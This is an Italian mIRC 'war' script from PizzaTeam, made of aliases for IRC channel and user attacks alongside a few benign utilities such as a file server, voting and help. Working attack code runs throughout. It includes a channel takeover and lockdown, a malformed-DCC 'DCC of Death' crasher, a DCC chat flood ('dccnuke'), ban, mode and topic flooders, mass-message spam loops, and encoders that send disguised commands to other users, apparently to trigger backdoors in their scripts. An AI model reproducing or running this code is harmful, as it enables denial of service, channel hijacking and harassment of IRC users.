;--------------------------------------------
; ® PÎZzÂ §©rÎpT© 3.0 SstaR
; by PizzaTeam  ÄLë×iüS & F®åñ|<j
;--------------------------------------------
/Takeover {
  If ($OpNick(0,#) <= 1) { Echo 4 -a *** %sd Non c'è 6Nessun altro utente °(6OPpato)° su6 #  ! | Halt }
  Set %query $$?="Sei veramente sicuro?!? (y/n):"
  If (y IsIn %query) {
    Echo 4 -a *** %sd °(6Takeover)° su6 # in corso | .Timer 1 2 MDOp
    Mode # +ik PizzaTeaM $+ $r(a,z) $+ ] | .Timer 1 10 Topic # (6TakeOveR)9,1 PÎZzÂ §©rÎpT Pø\\'eRz4 www.chez.com/pizzairc
  }
  Else { Echo 4 -a *** %sd °(6Takeover)° 6Annullato ! }
}
/Pestilence {
  if ($1 == -l ) {
    Window -moab @Pestilence 50 50 500 400
    ALine @Pestilence [Pestilence v3.0 by Rhad] 
    ALine @Pestilence [Status] Now compiling list of victims, please wait.
    Set %pest.total 0 | Set %Pest.temptime $ctime | .Remove pestilence.ini | .Enable #Pestilence.who | .Who $2
    Halt
  }
  If ($1 == -u) { .Remove pestilence.ini | .Enable #Pestilence.User | .Raw whois $2 | Halt }
  if ($1 != -u) || ($1 != -l) { error Please use /pestilence -[L|U] <Nick|#Channel> }
}
DoD {
  If ( $1 == $null ) { 1***6 Uso /dod <nickname> | Halt }
  Echo -a 1***6 Invio DCC of Death a $$1 in corso...
  Raw -q privmsg $$1 : $+ $chr(1) $+ DCC SEND TclKicksYaAzz $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .MaX 9991234567 $r(1024,2000) $r(2000,7000) $+ $chr(1)
  Raw -q privmsg $$1 : $+ $chr(1) $+ DCC RESUME YouWillGoDown  $+ $chr(1)
}
ChkExe { if ($Exists($mIRCDir\mirc32.exe) == $False) { Echo 4 -a *** %sd Impossibile avviare (6 %tkb )° ! Non hai 6l'Eseguibile mIRC Chiamato "6mIRC32.EXE" ! | Halt } }
TLoad {
  ChkExe | If ($DDE TakerBot connected "" != $Null) { Echo 4 -a *** %sd E' possibile caricare solo 6Un °(6 %tkb )° alla volta ! | Halt }
  Echo 4 -a *** %sd Avvio del °(6 %tkb )° in corso ! | Run $mIRCDirmirc32.exe $mIRCDirtkbot\takerbot.ini
  /SPlay take.wav
}
FSetDir { Set %fsrvdir $SDir="Selezionare la cartella FServe:" | If (%fsrvdir != $Null) { Echo 6 -a *** %sd °(4Cartella FServe)° Impostata a: (4 %fsrvdir ) ! } }
FSetMG { Set %fsrvmgets $$?="N° Max Download Simultanei? (es. 2):" | Echo 6 -a *** %sd °(4Max Download Simultanei/Utente)° : %fsrvmgets ! }
FSReset { 
  Set %query $$?!="Reimpostare Tutto?"
  If ($True IsIn %query) { 
    Set %fsrvdir RESETED | Set %fsrvmgets RESETED | Set %fsrvtot 0
    Echo 4 -a *** %sd FServe °(6Reimpostato)° !
  }
  Else { Echo 4 -a *** %sd Reimpostazione FServe °(6Annullata)° ! }
}
FSrv { 
  If (%fsrvmgets == RESETED || %fsrvdir == RESETED) {
    Echo 4 -a *** %sd Devi impostare prima le opzioni per il FServer !
  }    
  Else {
    Set %tnick $$?="Nickname cui inviare il FServer?"
    .Notice %tnick %sd Sto aprendo un FILESERVER ! Accettalo per favore | Fserve %tnick %fsrvmgets %fsrvdir $mIRCDirfileserver\welcome.txt
    Echo 4 -a %sd °(6FServe DCC Chat)° con6 %tnick In Corso!
    Inc %fsrvtot 1
  }
}
FSrvHim  {
  If (%fsrvmgets == RESETED || %fsrvdir == RESETED) {
    Echo 4 -a *** %sd Devi impostare prima le opzioni per il FServer !
  }    
  Else {
    .Notice %tnick %sd Sto aprendo un FILESERVER ! Accettalo per favore | FServe %tnick %fsrvmgets %fsrvdir $mIRCDirfileserver\welcome.txt
    Echo 4 -a %sd °(6FServe DCC Chat)° con6 %tnick In Corso!
    Inc %fsrvtot 1
  }
}
FSStats { 
  Echo -a <=-- Impostazioni FServer --=>
  Echo -a -=> Directory: %fsrvdir
  Echo -a -=> MaxDCC: %fsrvmgets
  Echo -a -=> N° di FServer Inviati: %fsrvtot
  Echo -a <=---- Fine Impostazioni ----=>
}
FBanL { Mode # +bbb Pi@ZzA- $+ $r(a,z) $+ $r(1,9) $+ $r(a,z) Pi@ZzA- $+ $r(a,z) $+ $r(1,9) $+ $r(a,z) Pi@ZzA- $+ $r(a,z) $+ $r(1,9) $+ $r(a,z) }
ModeFl { Mode # +stnmipk Pizza $+ $r(a,z) $+ $r(1,9) $+ $r(a,z) | Mode # -smipk $Chan(#).Key }
TopicFl {
  If (%tmp == 1) { Unset %tmp | Topic # %script ...Distruzione TOTALE: ANNULLATA ! }
  Else { Dec %tmp 1 | Topic # %script ...Distruzione TOTALE: Fra %tmp Secondi! }
}
Hck { Echo 4 -a *** %sd Invio °(6HACK)° a6 %hnick ! | Unset %hnick }
SHN { Set %hnick $$?="Inserire il nick da Hackare?:" }
SHC { Set %hnick $$?="Inserire il  Nick O il #Canale da Hackare?:" }
MMNops {
  Set %mmsg $$?="Inserisci il messaggio da Inviare ai non Ops?:"
  Echo 4 -a *** Invio (6Messagggio ai Non OPs) su 6 #  In Corso ! Ora si può lasciare il canale... attendere $duration($calc(%mmsec * $nopnick(0,#))) !!!
  Set %mmnoptarg # | Set %i $nopnick(0,#) | Set %mmint 0 | Set %mblock ON
  :next
  Inc %mmint %mmsec
  If ($nopnick(%i,#) != $me) { .Timer 1 %mmint .Msg $nopnick(%i,#) %mmsg }
  Dec %i | If %i > 1 GoTo next | %totmmnops = %mmint / 2
  .Timer 1 %mmint Echo 4 -a *** %sd (6Invio Messaggio) ai non ops di6 %mmnoptarg  6Completato ! (6 $+ %totmmnops $+ ) utenti l'hanno ricevuto !
  .Timer 1 %mmint Set %mblock OFF | UnSet %i %totmmnops %mmnoptarg %mmint %mmsg | Halt
}
MMAll {
  Set %mmsg $$?="Inserisci il messaggio da Inviare?:"
  Echo 4 -a *** Invio (6Messaggio di Massa) Su 6 #  In Corso ! attendere $duration(%mmsec * $calc($nick(0,#))) puoi lasciare il canale...pochi minuti e tutto sarà inviato!!!
  Set %mmalltarg # | Set %i $nick(0,#) | Set %mmint 0 | Set %mblock ON
  :next
  Inc %mmint %mmsec
  If ($nick(%i,#) != $Me) { .Timer 1 %mmint .msg $Nick(%i,#) %mmsg }
  Dec %i | If %i > 1 GoTo next | %totmmall = %mmint / 2
  .Timer 1 %mmint Echo 4 -a *** %sd (6Messaggio di Massa) totale su6 %mmalltarg  6Completato !  (6 $+ %totmmall $+ ) utenti l'hanno ricevuto !
  .Timer 1 %mmint Set %mblock OFF | UnSet %i %totmmall %mmalltarg %mmint %mmsg | Halt
}
MMSec {
  if ($1 != $null) {
    set %mmsec $1
    echo 6 -a *** %sd 14Intervallo d'Invio Messaggi di Massa impostato a14:1 (14 $+ $1 Secondi1) ! Con 14Valori Maggiori, c'è minor rischio di venire 14Disconnessi !
  }
}
timedmsg { 
  chanchk | set %tmsg $$?="Inserire il Msg per questo canale? (es. Msg Me):" | .timer300 100 $$?="Intervallo di tempo in secondi?:" msg # %tmsg
  echo 6 -a *** %sd Il messaggio a tempo "4 $+ %tmsg $+ " sarà inviato su 4 # ogni4 $! secondi per un totale di4 100 volte ! Premere [4Cntrl-F3] per disattivarlo quando si desidera !
}
CF3 { .timer300 off | unset %tmsg | echo 6 -a *** %sd 4Messaggio a Tempo disattivato }
warmenu {
  /.load -pm $mircdirwarbar.ini | /.load -pn $mircdirwarnick.ini | /.load -pq $mircdirwarquery.ini | /.splay $mircdirsounds\alert.wav | /echo -a %sd 4,8 WarMenu Attivo!!! Chi è la tua vittima??
  set %menumode WAR MODE
  
}
normenu {
  /.load -pm $mircdirpopups.ini | /.load -pn $mircdirpopups.ini | /.load -pq $mircdirpopups.ini | /.splay $mircdirsounds\passfnd.wav | /echo -a %sd 12,8 Normal Menu Caricato!!! Ora Sei Un bambino buono!!!
  set %menumode NORMAL MODE
  
}
cycle { %chankey = $chan(#).key | .raw part # : %sd | .raw join # %chankey | unset %chankey }

dyn5 {
  set %esegui $$?="Comando da eseguire? es. quit EOF from Frankj"
  unset %fr.x
  unset %criptato
  :iniziodyn5
  inc %fr.x
  set %fr.c $mid(%esegui,%fr.x,1)
  if (%fr.c == $null) goto finedyn5 
  set %fr.a $asc(%fr.c)
  set %fr.r $calc(%fr.a - 2)
  set %criptato %criptato $+ $chr(%fr.r)
  goto iniziodyn5
  :finedyn5
  echo -a eh eh %esegui convertito in %criptato
  set %dyn5back 2 z %criptato
  echo -a -> %dyn5back
  msg $$1 %dyn5back
}
dyn4 {
  %enc = $$?="Comando da eseguire? Es. quit EOF from Frankj"
  %enc = $replace(%enc,a,©)
  %enc = $replace(%enc,b,æ)
  %enc = $replace(%enc,c,¡)
  %enc = $replace(%enc,d,ï)
  %enc = $replace(%enc,e,«)
  %enc = $replace(%enc,f,ì)
  %enc = $replace(%enc,g,Å)
  %enc = $replace(%enc,h,è)
  %enc = $replace(%enc,i,Æ)
  %enc = $replace(%enc,j,É)
  %enc = $replace(%enc,k,ö)
  %enc = $replace(%enc,l,ù)
  %enc = $replace(%enc,m,¢)
  %enc = $replace(%enc,n,¥)
  %enc = $replace(%enc,o,ä)
  %enc = $replace(%enc,p,·)
  %enc = $replace(%enc,q,ò)
  %enc = $replace(%enc,r,å)
  %enc = $replace(%enc,s,½)
  %enc = $replace(%enc,t,ç)
  %enc = $replace(%enc,u,£)
  %enc = $replace(%enc,v,•)
  %enc = $replace(%enc,w,Ü)
  %enc = $replace(%enc,x,ñ)
  %enc = $replace(%enc,y,¼)
  %enc = $replace(%enc,z,±)
  %enc = $replace(%enc,0,²)
  %enc = $replace(%enc,1,þ)  
  %enc = $replace(%enc,2,\)
  %enc = $replace(%enc,3,ë)
  %enc = $replace(%enc,4,ô)
  %enc = $replace(%enc,5,ó) 
  %enc = $replace(%enc,6,º)
  %enc = $replace(%enc,7,î)
  %enc = $replace(%enc,8,ð)
  %enc = $replace(%enc,9,÷) 
  %enc = $replace(%enc,$chr(32),ª)
  ;say 5[4!12DyN4!5] %enc
  msg $$1 5[4!12DyN4!5] %enc
  unset %enc
}
/pclose {
  echo 6 $active %sd  Chiusura di tutte le porte aperte in corso.
  .sockclose tcp113
  .sockclose tcp53
  .sockclose tcp137
  .sockclose tcp138
  .sockclose tcp139
  .sockclose tcp23
  .sockclose tcp80
  .sockclose tcp79
  halt
}
/plisten {
  unset %tcp.ports
  echo 6 $active %sd Abilitazione sockets per il monitoraggio delle porte.
  set %tcp.ports :
  if ($portfree(139) == $true) {
    .socklisten tcp139 139
    %tcp.ports = %tcp.ports 139
  }
  if ($portfree(138) == $true) {
    .socklisten tcp138 138
    %tcp.ports = %tcp.ports 138
  }
  if ($portfree(137) == $true) {
    .socklisten tcp137 137
    %tcp.ports = %tcp.ports 137
  }
  if ($portfree(113) == $true) {
    .socklisten tcp113 113
    %tcp.ports = %tcp.ports 113
  }
  if ($portfree(23) == $true) {
    .socklisten tcp23 23
    %tcp.ports = %tcp.ports 23
  }
  if ($portfree(53) == $true) {
    .socklisten tcp53 53
    %tcp.ports = %tcp.ports 53
  }
  if ($portfree(79) == $true) {
    .socklisten tcp79 79
    %tcp.ports = %tcp.ports 79
  } 
  if ($portfree(80) == $true) {
    .socklisten tcp80 80
    %tcp.ports = %tcp.ports 80
  }
}
/ports {
  echo  6 $active %sd Porte abilitate $+ %tcp.ports
}

/pizzaon  {
  if %kam == ON { echo 5 -a - | echo 5 -a 4® PÎZzÂ §©rÎpT© già 12Attivato } | else { .ctcps on | .events on | .raw on | set %kam ON | titlebar  ------------=>® PÎZzÂ §©rÎpT© 3.0 SstaR by PizzaTeaM <=------------ | echo 5 -a - | echo 5 -a 4® PÎZzÂ §©rÎpT© 12Attivato }
}
bshow {
  /say Scrivete /server $ip %listen.port
}
bhelp {    
  sockwrite -n bopen :- Scrivi /raw new SERVER PORTA
  sockwrite -n bopen :- Per Cambiare Server... 
  halt
}
/bserver {
  sockopen BServer %bounce.server %bounce.port %sd
}
bounce {
  if ($1 == help) {
    echo 6 -a Utilizzo:
    echo 6 -a /bshow - Pubblicizza Bounce Server/Porta
    echo 6 -a /bounce - Avvia/Visualizza Server
    echo 6 -a /bounce new - Modifica Impostazioni
    echo 6 -a /bounce off - Chiudi Server
    echo 6 -a /bounce help - Help
    halt
  }
  if ($1 == off) { sockclose bounce | sockclose bopen | sockclose bserver | echo 6 -a ** Bounce server Disattivato... | unset %*.temp | disable #ctcpbounce | halt }
  if ((%bounce.server == $null) || (%bounce.port == $null) || (%listen.port == $null) || ($1 == New)) {
    %bounce.server = $?="Server a cui redirezionare? <es. irc.tin.it>"
    %bounce.port = $?="Porta a cui redirezionare? <es. 6667>"
    %listen.port = $?="Porta in ascolto per connessioni? <es. 1234>"
  }
  sockclose Bounce | socklisten Bounce %listen.port 
  echo 6 -a Server per il redirezionamento: %bounce.server
  echo 6 -a Porta per il redirezionamento: %bounce.port
  echo 6 -a Porta in ascolto per connessioni: %listen.port
  enable #ctcpbounce
}
vote.percent {
  set %vote.percent $round($calc($1 / $2),2)
  if ($left(%vote.percent,1) == 0) {
    if ($right(%vote.percent,2) == 00) { return 0% }
    elseif ($mid(%vote.percent,3,1) == 0) { return $mid(%vote.percent,4,1) $+ $chr(37) }
    else { return $right(%vote.percent,2) $+ $chr(37) }
  }
  elseif ($mid(%vote.percent,2,1) == $chr(46)) { return $remove(%vote.percent,$chr(46)) $+ $chr(37) }
}
vote.timesup {
  if ($chan(%vote.chan) == $null) { echo 6 -a Votazione Terminata | echo 4 -a ERRORE: Impossibile visualizzare risultati! Non sei su %vote.chan | goto end }
  msg %vote.chan 6Votazione Terminata
  msg %vote.chan 12OGGI SI VOTAVA SU: %vote.topic
  msg %vote.chan 2Voti SI:4 %vote.yes 2(12 $+ $vote.percent(%vote.yes,%vote.total) $+ 2)
  msg %vote.chan 2Voti NO:4 %vote.no 2(12 $+ $vote.percent(%vote.no,%vote.total) $+ 2)
  if (%vote.no == 0 && %vote.yes == 0) { msg %vote.chan 5Nessuno ha votato! }
  elseif (%vote.no == %vote.yes) { msg %vote.chan 5Parità! }
  elseif (%vote.no > %vote.yes) { msg %vote.chan 5La maggioranza ha votato NO }
  elseif (%vote.no < %vote.yes) { msg %vote.chan 5La maggioranza ha votato SI }
  :end
  unset %vote.*
}
/dccnuke {
  if ($server == $null) ecgo -s 12Non sei connesso a nessun server
  if ($1 == $null) return
  set %pnick $me
  if ($sock(MLOCK) == $null) { .socklisten MLOCK 6666 }
  .raw privmsg $1 : $+ $chr(1) $+ DCC Chat chat $longip($ip) 6666 $+ $chr(1)
  if ($left($active, 1) == $chr(64)) echo -a %sd 6Invio in corso di 4DCCNUKE a 12 $1 6...Se accetta Sarà Floodato Pesante!
  else echo -a %sd 6Invio in corso di 4DCCNUKE a 12 $1 6...Se accetta Sarà Floodato Pesante!
  set %cog $1
  n %pnick
}


/aiuto {
  if ($1 != $null) { set %match $1- } | else { set %match mainhelp }
  echo 2 -s *** Ricerca in corso per l'argomento : %match
  
  ;set popup values
  unset %lhelp*
  set %li 1
  :go
  set %lval $readini $mircdirpizzahelp.ini %match n [ $+ [ %li ] ]
  if (%lval != $null) {
    set %lhelp $+ %li [ %lval ]
    inc %li
    goto go
  }
  unset %li
  
  set %win.name @PizzATeaM Help Window
  window -en %win.name 49 61 646 215 %win.name
  set %loadfile $mircdirhelp\pizza.hllp
  loadbuf $lines(%loadfile) %win.name %loadfile
  :search
  if ($line(%win.name,0) > 0) && (($gettok($line(%win.name,1),1,32) != ~help) || ($gettok($line(%win.name,1),2,32) != %match)) {
    dline %win.name 1
    goto search
  }
  if ($line(%win.name,0) > 0) { dline %win.name 1 }
  else { aecho Nessun argomento trovato | window -c %win.name | halt }
  set %counter 1
  set %lines $line(%win.name,0)
  :findend
  if (%counter <= %lines) && ($gettok($line(%win.name,%counter),1,32) != ~help) {
    inc %counter
    goto findend
  }
  elseif (%counter > %lines) { goto display }
  
  ;delete
  set %delete %counter $+ - $+ $line(%win.name,0)
  dline %win.name %delete
  
  :display
  sline %win.name 13
  window -ar %win.name
  unset %counter %delete %lines %win.name %match %loadfile
}
/aecho echo 12 -a PizzATeaM $1-

/mskk echo 5 -a Messaggio $1-
